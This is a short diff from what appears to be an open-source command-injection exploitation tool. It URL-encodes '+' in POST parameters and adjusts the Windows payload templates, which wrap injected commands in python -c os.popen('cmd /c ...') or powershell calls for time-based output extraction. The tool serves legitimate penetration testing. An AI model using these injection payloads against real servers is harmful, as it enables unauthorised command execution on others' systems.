@@ -64,6 +64,7 @@ def examine_requests(payload, vuln_parameter, http_request_method, url, delay, u
 
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter)
+    parameter = parameter.replace("+","%2B")
     # Define the POST data   
     if settings.IS_JSON == False:
       data = re.sub(settings.INJECT_TAG, payload, parameter)
@@ -111,6 +112,7 @@ def injection_test(payload, http_request_method, url):
     parameter = urllib2.unquote(parameter)
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter)
+    parameter = parameter.replace("+","%2B")
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
     
@@ -169,7 +171,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, ht
   if settings.TARGET_OS == "win":
     previous_cmd = cmd
     if alter_shell:
-      cmd = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
+      cmd = settings.WIN_PYTHON_DIR + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
     else: 
       cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
 
